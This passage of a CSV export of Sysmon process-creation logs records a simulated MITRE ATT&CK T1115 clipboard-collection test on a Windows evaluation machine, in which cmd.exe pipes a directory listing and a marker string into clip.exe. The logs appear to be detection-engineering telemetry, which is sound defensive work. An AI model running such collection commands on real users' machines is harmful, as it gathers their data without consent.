LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=C2F44EA3178B834CA71418841238D09F,SHA256=3CFC03AC663A4EA6B078EEB2FD9245294DEE402376C52EBFEF3A218CBBDBAEFC,IMPHASH=FFEDF33A1AF6412E26F1F659C12D5FF7

ParentProcessGuid: {f57bd86a-9318-658c-c501-000000000f00}

ParentProcessId: 8468

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c dir | clip & echo ""T1115"" > %temp%\T1115.txt & clip < %temp%\T1115.txt

ParentUser: WINDEV2309EVAL\User",Info,clip.exe,"""cmd.exe"" /c dir | clip & echo ""T1115"" > %temp%\T1115.txt & clip < %temp%\T1115.txt",C:\Windows\System32\cmd.exe,{f57bd86a-9318-658c-c501-000000000f00},8468,WINDEV2309EVAL\User,{f57bd86a-9318-658c-c901-000000000f00},3588,9916,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T21:11:52.8955878Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 21:11:52.894,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T21:11:52.8955878Z""/>
      <EventRecordID>19576</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 21:11:52.894</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-9318-658c-c901-000000000f00}</Data>
      <Data Name=""ProcessId"">9916</Data>
      <Data Name=""Image"">C:\Windows\System32\clip.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Clip - copies the data into clipboard</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">clip.exe</Data>
      <Data Name=""CommandLine"">clip  </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=C2F44EA3178B834CA71418841238D09F,SHA256=3CFC03AC663A4EA6B078EEB2FD9245294DEE402376C52EBFEF3A218CBBDBAEFC,IMPHASH=FFEDF33A1AF6412E26F1F659C12D5FF7</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-9318-658c-c501-000000000f00}</Data>
      <Data Name=""ParentProcessId"">8468</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c dir | clip &amp; echo ""T1115"" &gt; %temp%\T1115.txt &amp; clip &lt; %temp%\T1115.txt</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 21:11:52.894

ProcessGuid: {f57bd86a-9318-658c-c901-000000000f00}

ProcessId: 9916

Image: C:\Windows\System32\clip.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Clip - copies the data into clipboard

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: clip.exe

CommandLine: clip  

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=C2F44EA3178B834CA71418841238D09F,SHA256=3CFC03AC663A4EA6B078EEB2FD9245294DEE402376C52EBFEF3A218CBBDBAEFC,IMPHASH=FFEDF33A1AF6412E26F1F659C12D5FF7

ParentProcessGuid: {f57bd86a-9318-658c-c501-000000000f00}

ParentProcessId: 8468

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c dir | clip &amp; echo ""T1115"" &gt; %temp%\T1115.txt &amp; clip &lt; %temp%\T1115.txt

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,clip  ,Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Clip - copies the data into clipboard,1,19575,10.0.22621.1 (WinBuild.160101.0800),"MD5=C2F44EA3178B834CA71418841238D09F,SHA256=3CFC03AC663A4EA6B078EEB2FD9245294DEE402376C52EBFEF3A218CBBDBAEFC,IMPHASH=FFEDF33A1AF6412E26F1F659C12D5FF7",C:\Windows\System32\clip.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 21:11:52.872

ProcessGuid: {f57bd86a-9318-658c-c801-000000000f00}

ProcessId: 8732

Image: C:\Windows\System32\clip.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Clip - copies the data into clipboard

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: clip.exe

CommandLine: clip  

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=C2F44EA3178B834CA71418841238D09F,SHA256=3CFC03AC663A4EA6B078EEB2FD9245294DEE402376C52EBFEF3A218CBBDBAEFC,IMPHASH=FFEDF33A1AF6412E26F1F659C12D5FF7

ParentProcessGuid: {f57bd86a-9318-658c-c501-000000000f00}

ParentProcessId: 8468

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c dir | clip & echo ""T1115"" > %temp%\T1115.txt & clip < %temp%\T1115.txt

ParentUser: WINDEV2309EVAL\User",Info,clip.exe,"""cmd.exe"" /c dir | clip & echo ""T1115"" > %temp%\T1115.txt & clip < %temp%\T1115.txt",C:\Windows\System32\cmd.exe,{f57bd86a-9318-658c-c501-000000000f00},8468,WINDEV2309EVAL\User,{f57bd86a-9318-658c-c801-000000000f00},3588,8732,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T21:11:52.8749584Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 21:11:52.872,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T21:11:52.8749584Z""/>
      <EventRecordID>19575</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 21:11:52.872</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-9318-658c-c801-000000000f00}</Data>
      <Data Name=""ProcessId"">8732</Data>
      <Data Name=""Image"">C:\Windows\System32\clip.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Clip - copies the data into clipboard</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">clip.exe</Data>
      <Data Name=""CommandLine"">clip  </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=C2F44EA3178B834CA71418841238D09F,SHA256=3CFC03AC663A4EA6B078EEB2FD9245294DEE402376C52EBFEF3A218CBBDBAEFC,IMPHASH=FFEDF33A1AF6412E26F1F659C12D5FF7</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-9318-658c-c501-000000000f00}</Data>
      <Data Name=""ParentProcessId"">8468</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c dir | clip &amp; echo ""T1115"" &gt; %temp%\T1115.txt &amp; clip &lt; %temp%\T1115.txt</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 21:11:52.872

ProcessGuid: {f57bd86a-9318-658c-c801-000000000f00}

ProcessId: 8732

Image: C:\Windows\System32\clip.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Clip - copies the data into clipboard

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: clip.exe

CommandLine: clip  

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=C2F44EA3178B834CA71418841238D09F,SHA256=3CFC03AC663A4EA6B078EEB2FD9245294DEE402376C52EBFEF3A218CBBDBAEFC,IMPHASH=FFEDF33A1AF6412E26F1F659C12D5FF7

ParentProcessGuid: {f57bd86a-9318-658c-c501-000000000f00}

ParentProcessId: 8468

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c dir | clip &amp; echo ""T1115"" &gt; %temp%\T1115.txt &amp; clip &lt; %temp%\T1115.txt

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"C:\Windows\system32\cmd.exe  /S /D /c"" dir """,Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,1,19574,10.0.22621.2506 (WinBuild.160101.0800),"MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 21:11:52.866

ProcessGuid: {f57bd86a-9318-658c-c701-000000000f00}

ProcessId: 5000

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: C:\Windows\system32\cmd.exe  /S /D /c"" dir ""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {f57bd86a-9318-658c-c501-000000000f00}

ParentProcessId: 8468

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c dir | clip & echo ""T1115"" > %temp%\T1115.txt & clip < %temp%\T1115.txt

ParentUser: WINDEV2309EVAL\User",Info,Cmd.Exe,"""cmd.exe"" /c dir | clip & echo ""T1115"" > %temp%\T1115.txt & clip < %temp%\T1115.txt",C:\Windows\System32\cmd.exe,{f57bd86a-9318-658c-c501-000000000f00},8468,WINDEV2309EVAL\User,{f57bd86a-9318-658c-c701-000000000f00},3588,5000,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T21:11:52.8675277Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 21:11:52.866,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T21:11:52.8675277Z""/>
      <EventRecordID>19574</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 21:11:52.866</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-9318-658c-c701-000000000f00}</Data>
      <Data Name=""ProcessId"">5000</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">C:\Windows\system32\cmd.exe  /S /D /c"" dir ""</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-9318-658c-c501-000000000f00}</Data>
      <Data Name=""ParentProcessId"">8468</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c dir | clip &amp; echo ""T1115"" &gt; %temp%\T1115.txt &amp; clip &lt; %temp%\T1115.txt</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 21:11:52.866

ProcessGuid: {f57bd86a-9318-658c-c701-000000000f00}

ProcessId: 5000

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: C:\Windows\system32\cmd.exe  /S /D /c"" dir ""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {f57bd86a-9318-658c-c501-000000000f00}

ParentProcessId: 8468

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c dir | clip &amp; echo ""T1115"" &gt; %temp%\T1115.txt &amp; clip &lt; %temp%\T1115.txt

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""cmd.exe"" /c dir | clip & echo ""T1115"" > %%temp%%\T1115.txt & clip < %%temp%%\T1115.txt",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,1,19573,10.0.22621.2506 (WinBuild.160101.0800),"MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 21:11:52.840

ProcessGuid: {f57bd86a-9318-658c-c501-000000000f00}

ProcessId: 8468

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c dir | clip & echo ""T1115"" > %%temp%%\T1115.txt & clip < %%temp%%\T1115.txt

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,Cmd.Exe,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-9318-658c-c501-000000000f00},3588,8468,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T21:11:52.8413748Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 21:11:52.840,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T21:11:52.8413748Z""/>
      <EventRecordID>19573</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 21:11:52.840</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-9318-658c-c501-000000000f00}</Data>
      <Data Name=""ProcessId"">8468</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">""cmd.exe"" /c dir | clip &amp; echo ""T1115"" &gt; %%temp%%\T1115.txt &amp; clip &lt; %%temp%%\T1115.txt</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 21:11:52.840

ProcessGuid: {f57bd86a-9318-658c-c501-000000000f00}

ProcessId: 8468

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c dir | clip &amp; echo ""T1115"" &gt; %%temp%%\T1115.txt &amp; clip &lt; %%temp%%\T1115.txt

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
